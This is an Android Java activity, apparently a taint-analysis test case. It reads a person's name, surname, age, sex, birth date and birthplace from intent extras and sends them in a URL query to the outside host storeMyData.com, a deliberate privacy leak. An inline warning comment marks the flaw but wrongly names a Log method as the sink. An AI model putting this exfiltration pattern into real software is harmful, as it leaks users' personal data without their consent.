package ex.com.lifecycleexample;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;

import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
public class SecondActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.second_activity);
        try {
            new URL("http://www.storeMyData.com/?CF=" + getCodiceFiscale()).openConnection(); //WARNING//Intents,Injection: taintedness is flowing into the Log method.
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }
    private String getCodiceFiscale() {
        String name = this.getIntent().getStringExtra("name");
        String surname = this.getIntent().getStringExtra("surname");
        String age = this.getIntent().getStringExtra("age");
        String sex = this.getIntent().getStringExtra("sex");
        String date = this.getIntent().getStringExtra("date");
        String placeOfBirth = this.getIntent().getStringExtra("place");
        return name + surname + age + sex + date + placeOfBirth;
    }

}
